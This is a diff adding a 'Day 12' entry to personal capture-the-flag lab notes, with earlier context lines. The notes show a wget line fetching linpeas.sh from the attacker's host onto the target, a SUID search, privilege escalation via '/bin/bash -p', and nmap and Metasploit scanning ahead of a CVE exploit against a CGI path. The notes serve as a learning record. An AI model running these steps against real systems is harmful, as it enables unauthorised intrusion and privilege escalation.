@@ -124,3 +124,13 @@ user:[elfmcelferson] rid:[0x3e9]
 - Download linpeas.sh on the vuln machine in /tmp `wget http://10.8.97.41:8080/linpeas.sh`
 - Instead of linpeas, to just find SUID files you can use `find / -perm -u=s -type f 2>/dev/null`
 - Stumbled a bit with what I could actually do with /bin/bash that had the SUID bit set, turned out I had to include the -p switch to turn on privileged mode, so `/bin/bash -p`.
+
+# Day 12
+
+`export IP=10.10.135.29`
+
+- First run an nmap to see which ports are open.
+- Start metasploit and create a new `workspace -a day12`.
+- `use auxiliary/scanner/portscan/tcp`
+- Run a scan using `db_nmap -sV -Pn -A -p 3389,8009,8080 10.10.135.29`
+- After searching for the right cve and using that in metasploit we have to configure the options. Took a long time to discover that I should use the /cgi-bin/elfwhacker.bat that was desribed in the descrption...
